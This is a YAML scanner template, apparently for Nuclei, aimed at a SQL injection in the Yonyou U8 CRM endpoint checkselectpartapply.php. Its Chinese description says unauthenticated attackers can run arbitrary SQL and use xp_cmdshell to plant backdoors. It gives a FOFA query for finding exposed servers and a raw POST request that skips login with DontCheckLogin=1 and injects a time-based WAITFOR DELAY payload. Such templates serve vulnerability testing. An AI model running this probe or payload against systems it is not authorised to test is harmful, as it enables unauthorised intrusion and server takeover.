id: YonYou-U8-CRM-checkselectpartapply-SQL

info:
  name: "用友U8 CRM checkselectpartapply.php SQL注入漏洞"
  author: HuanXiong
  severity: high
  description: |-
    fofa: title="用友U8CRM"
    用友 U8 CRM客户关系管理系统 checkselectpartapply.php 接口存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - 
  tags: 用友U8

http:
  - raw:
      - |
        POST /partrtn/checkselectpartapply.php?DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        applyIDs=1);WAITFOR+DELAY+'0:0:4'--

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && duration>=4 && duration<=5"